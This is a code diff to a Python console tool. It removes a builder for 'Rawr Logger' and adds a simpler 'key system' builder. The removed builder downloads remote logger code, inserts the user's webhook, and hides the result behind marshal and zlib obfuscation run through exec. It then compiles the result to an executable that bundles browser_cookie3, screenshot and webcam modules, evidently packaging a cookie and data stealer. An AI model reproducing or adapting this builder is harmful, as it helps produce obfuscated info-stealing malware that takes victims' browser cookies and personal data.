@@ -17,30 +17,20 @@ Write.Print(Center.XCenter("""
                      /$$  | $$                 /$$  | $$                                            
                     |  $$$$$$/                |  $$$$$$/                                            
                      \______/                  \______/                                             
-              Made By mishonov#0001                                                                               
-\n"""), Colors.green_to_yellow, interval=0)
-name = Write.Input("Enter Your Name:", Colors.green_to_yellow, interval=0.01)
-code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
-with open(f"{name}.py", 'w', encoding='utf8') as f:
-    f.write(code.text.replace("Webhooksss", webhook))
-Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
-prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.white_to_green, interval=0.01)
-with open(f'{name}.py') as fi:
-    pro = fi.read()
-    mar = marshal.dumps(pro)
-    zlb = zlib.compress(mar)
-    with open(f"{name}.py", 'w') as f:
-        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
-    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
-    if compile == "y":
-        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil"  --hidden-import="cv2" --hidden-import="psutil"  --hidden-import="win32api" {name}.py')
-        os.remove(f'{name}.spec')
-        Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
-        time.sleep(2)
-        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-        time.sleep(3)
-        exit()
-    elif compile == "n":
-      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+              Made By mishonov#0001 
+\n"""), Colors.yellow, interval=0)
+name = Write.Input("Enter File Name:", Colors.yellow_to_green, interval=0.01)
+keysys = Write.Input("Enter Key System Name:", Colors.orange_to_yellow, interval=0.01)
+code = requests.get("https://raw.githubusercontent.com/mishonovlol/simple-key-system/main/key.py")
+with open(f"{name}.py", 'w') as f:
+    f.write(code.text.replace("nameing", keysys))
+Write.Print("Key System Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
+yo = Write.Input("Would you like a tutorial y/n:", Colors.yellow_to_green, interval=0.01)
+if yo == "y":
+   Write.Print("Build the key system, edit the file created, input your key and then add your script where is says to add it (YOU CAN ALSO OBFUSCATE IT)\n",Colors.white_to_green, interval=0.01)
+elif yo == "n":
+      Write.Print("Okay\n",Colors.white_to_green, interval=0.01) 
       time.sleep(3)
       exit()
+      
+#DONT EDIT ANYTHING
